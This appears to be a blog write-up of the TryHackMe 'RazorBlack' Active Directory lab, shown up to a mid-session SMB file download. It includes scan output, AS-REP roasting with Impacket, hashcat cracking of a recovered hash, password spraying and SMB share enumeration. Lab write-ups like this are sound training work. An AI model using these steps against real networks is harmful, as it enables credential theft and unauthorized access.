---
title: "THM - RazorBlack"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # RazorBlack"
categories:
  - THM
---

The given box ```RazorBlack``` is a AD machine 

- [TryHackMe- RazorBlack](#tryhackme---razorblack)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)
    - [RPC](#rpc)
    	- [usernames](#usernames)
    	- [AD username format ](#AD-username-format)
    	- [Request AS_REP message](#Request-AS_REP-message)
    	- [Cracking the hash](#Cracking-the-hash)
  

## Recon

### Nmap Scan Result

On performing a nmap scan on the target, we can see there are 32 standard ports open

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# masscan -p1-65535,U:1-65535 --rate=1000 10.10.135.22 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-11 15:34:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 58637/udp on 10.10.135.22
Discovered open port 389/tcp on 10.10.135.22
Discovered open port 49679/tcp on 10.10.135.22
Discovered open port 636/tcp on 10.10.135.22
Discovered open port 135/tcp on 10.10.135.22
Discovered open port 593/tcp on 10.10.135.22
Discovered open port 53/tcp on 10.10.135.22
Discovered open port 49669/tcp on 10.10.135.22
Discovered open port 49856/tcp on 10.10.135.22
Discovered open port 49667/tcp on 10.10.135.22
Discovered open port 49674/tcp on 10.10.135.22
Discovered open port 57300/udp on 10.10.135.22
Discovered open port 9389/tcp on 10.10.135.22
Discovered open port 49676/tcp on 10.10.135.22
Discovered open port 49664/tcp on 10.10.135.22
Discovered open port 2049/tcp on 10.10.135.22
Discovered open port 47001/tcp on 10.10.135.22
Discovered open port 3268/tcp on 10.10.135.22
Discovered open port 49665/tcp on 10.10.135.22
Discovered open port 57651/udp on 10.10.135.22
Discovered open port 5985/tcp on 10.10.135.22
Discovered open port 3389/tcp on 10.10.135.22
Discovered open port 464/tcp on 10.10.135.22
Discovered open port 88/tcp on 10.10.135.22
Discovered open port 49708/tcp on 10.10.135.22
Discovered open port 3269/tcp on 10.10.135.22
Discovered open port 139/tcp on 10.10.135.22
Discovered open port 58941/udp on 10.10.135.22
Discovered open port 111/tcp on 10.10.135.22
Discovered open port 445/tcp on 10.10.135.22
Discovered open port 49675/tcp on 10.10.135.22
Discovered open port 49694/tcp on 10.10.135.22
```

And also it discovered that the machine is running ```Windows``` OS

```shell
# Nmap 7.92 scan initiated Sat Jul  9 19:57:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/_full_tcp_nmap.txt -oX /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/xml/_full_tcp_nmap.xml 10.10.247.120
Increasing send delay for 10.10.247.120 from 0 to 5 due to 611 out of 1527 dropped probes since last increase.
Increasing send delay for 10.10.247.120 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.247.120
Host is up, received user-set (0.18s latency).
Scanned at 2022-07-09 19:57:27 IST for 1142s
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-09 14:41:39Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-08T14:26:08
| Not valid after:  2023-01-07T14:26:08
| MD5:   8e38 471c d08c 1570 27b1 20e9 faa4 b519
| SHA-1: 12da c7ca 7abc 435f f6ea 542a 6322 db63 8098 ee98
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQQKxL8oWvM7hDGk2gbBkKsTANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdIQVZFTi1EQy5yYXowcmJsYWNrLnRobTAeFw0yMjA3MDgxNDI2
| MDhaFw0yMzAxMDcxNDI2MDhaMCIxIDAeBgNVBAMTF0hBVkVOLURDLnJhejByYmxh
| Y2sudGhtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0G39e8XIgDuJ
| xMo4IARZCUyCHEWSvqfKODuuj7pdViGtlGOLb1oPLca0lHc9l07zhh45PnNrv/CC
| ehPWfeAeFADdCb+iXlip0lZqvUlCImUbbpMO/NUL9SVhOqA12uH4J7NJK0GgW2x4
| +8g6VD4zPheZfAUOuQECmLRtATSfGW1UewvscL16ih9m2VUXEjdClyK4sq/Fjh5Q
| MgftbQQyqRA3eyNnm69lsbrCJnJ/sxRLjGifkXfB+uCmkw8ZbvmsXqG9xk1VCyf8
| cLn7h5NhgSW1Yr+Xt9wG74SDW2xadloIVsedPdqtRlB8BVaD9271hLAhZky8WAz4
| qLkK0TwuBQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAECk0mch8qtKekAn+uZTYz+i7sABSy7nek34
| L3RNVvYaSAXK0UBF7EFZmq4Ye0EPs390q2LbEbjji3qSWcQywQ6MK5CDBwgfzfU/
| 1x73ieELRcmWiU1X69xdbJr5CdaBbpb8Bapm8+e7pOjHsLH3Qd0Q2ZW3dBMWQQDI
| BBioVi8nJ1ISt3Coy0sYGPy+eKQcIA0D8Y6JOLkZLPaxDyvqx7hmoSXn/ONPQ4Ti
| hP4h/anme8+uNWO1iWYlDR2OgtQTYN24in1/74Etdj3pZX/Fbp04DCNIVcsCmx/R
| rFKZaKnwIvk+Y9zcolud1gMdD9UNaUrkcxLzJkiOdPqcHLN7Fa8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-07-09T14:44:35+00:00
|_ssl-date: 2022-07-09T14:44:44+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/9%OT=53%CT=1%CU=39653%PV=Y%DS=2%DC=T%G=Y%TM=62C994C5
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=
OS:S%TS=U)OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505N
OS:W8NNS%O6=M505NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8
OS:0%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43629/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27615/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49191/udp): CLEAN (Failed to receive data)
|   Check 4 (port 47775/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-09T14:44:37
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   172.31 ms 10.11.0.1
2   179.02 ms 10.10.247.120

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  9 20:16:29 2022 -- 1 IP address (1 host up) scanned in 1142.90 seconds

```

## Enumeration

### RPC 

While enumerating port 111 a nfs is been opened, And found a flag ```THM{ab53e05c9a98def00314a14ccbfa8104}```  from sbradley user and one more file is there where all usernames was mentioned.

```shell
Export list for 10.10.247.120:
/users (everyone)

root@rE3oN:~/thm/machines/medium/raz0rblack# mount 10.10.135.22:/users /mnt/users

root@rE3oN:~/thm/machines/medium/raz0rblack# ls /mnt/users
employee_status.xlsx  sbradley.txt

root@rE3oN:~/thm/machines/medium/raz0rblack# cat /mnt/users/sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}

```

<center>
<img src="https://github.com/enum-more/obsidian_vault/raw/main/razorblack0/secret.png" style="width:40%">
</center>

###### usernames

	 daven port
	 imogen royce
	 tamara vidal
	 arthur edwards
	 carl ingram
	 nolan cassidy
	 reza zaydan
	 ljudmila vetrova
	 rico delgado
	 tyson williams
	 steven bradley
	 chamber lin

###### AD username format

	 dport
	 iroyce
	 tvidal
	 aedwards
	 cingram
	 ncassidy
	 rzaydan
	 lvetrova
	 rdelgado
	 twilliams
	 sbradley
	 clin
	

#### Request AS_REP message

Trying TGT with help of converted usernames..

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile usernames_mod.txt -format hashcat -outputfile asreproast_hash.txt -dc-ip 10.10.135.22
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Got the hash of ```twilliams``` 

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# cat asreproast_hash.txt
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd
```

#### Cracking the hash


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 18200 asreproast_hash.txt /usr/share/wordlists/rockyou.txt | tee kerberoast-password.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd:roastpotatoes

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291...900bcd
Time.Started.....: Mon Jul 11 21:59:30 2022 (2 secs)
Time.Estimated...: Mon Jul 11 21:59:32 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1784.0 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4221952/14344385 (29.43%)
Rejected.........: 0/4221952 (0.00%)
Restore.Point....: 4220928/14344385 (29.43%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: robb-lfc -> roastmutton

Started: Mon Jul 11 21:59:29 2022
Stopped: Mon Jul 11 21:59:34 2022

```


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -H 10.10.40.138 -u twilliams -p roastpotatoes
[+] IP: 10.10.40.138:445        Name: 10.10.40.138
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        trash                                                   NO ACCESS       Files Pending for deletion

```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.40.138 -u usernames_mod.txt -p roastpotatoes  --continue-on-success
SMB         10.10.40.138    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE

```


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbpasswd -r 10.10.40.138 -U sbradley
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley on 10.10.40.138.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123
[+] IP: 10.10.40.138:445        Name: 10.10.40.138
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    lsass
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    scerpc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-3ec-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    epmapper
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-2b4-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    eventlog
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-434-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    atsvc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Ctx_WinStation_API_service
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-1
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-33c-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    SessEnvPublicRpc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\49670
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    6b2ce3a02cafe066
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\593
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-680-0
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    spoolss
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-968-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    netdfs
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-300-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a68-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\health
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\termination
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a2c-0
        NETLOGON                                                READ ONLY       Logon server share
        .\NETLOGON\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        SYSVOL                                                  READ ONLY       Logon server share
        .\SYSVOL\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    raz0rblack.thm
        .\SYSVOL\raz0rblack.thm\*
        dr--r--r--                0 Tue Feb 23 20:33:11 2021    .
        dr--r--r--                0 Tue Feb 23 20:33:11 2021    ..
        dr--r--r--                0 Mon Jul 11 22:17:27 2022    DfsrPrivate
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Policies
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    scripts
        .\SYSVOL\raz0rblack.thm\Policies\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        fr--r--r--               23 Tue Feb 23 20:44:46 2021    GPT.INI
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    MACHINE
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
        fr--r--r--             2796 Tue Feb 23 20:36:52 2021    Registry.pol
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Scripts
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Shutdown
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Startup
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        fr--r--r--               22 Tue Feb 23 20:30:16 2021    GPT.INI
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    MACHINE
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
        trash                                                   READ ONLY       Files Pending for deletion
        .\trash\*
        dr--r--r--                0 Tue Mar 16 11:31:28 2021    .
        dr--r--r--                0 Tue Mar 16 11:31:28 2021    ..
        fr--r--r--             1340 Fri Feb 26 00:59:05 2021    chat_log_20210222143423.txt
        fr--r--r--         18927164 Tue Mar 16 11:32:20 2021    experiment_gone_wrong.zip
        fr--r--r--               37 Sun Feb 28 00:54:21 2021    sbradley.txt

```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbclient -U 'sbradley' \\\\10.10.45.238\\trash
Password for [WORKGROUP\sbradley]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 11:31:28 2021
  ..                                  D        0  Tue Mar 16 11:31:28 2021
  chat_log_20210222143423.txt         A     1340  Fri Feb 26 00:59:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 11:32:20 2021
  sbradley.txt                        A       37  Sun Feb 28 00:54:21 2021

                5101823 blocks of size 4096. 1003171 blocks available
smb: \> mget *
Get file chat_log_20210222143423.txt? y
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
